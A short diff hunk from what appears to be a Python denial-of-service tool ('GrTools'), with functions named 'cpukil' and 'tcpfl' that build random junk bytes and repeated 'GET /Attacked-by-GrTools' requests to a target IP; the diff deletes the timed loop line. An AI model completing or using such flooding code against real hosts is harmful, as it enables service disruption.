@@ -100,7 +100,6 @@ def cpukil():
 
 def tcpfl():
     grtools = os.urandom(15419) + random._urandom(10414)
-    while datetime.datetime.now() < expiration_date:
         get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
         request  = get_host + Headers + "\r\n"
     else:
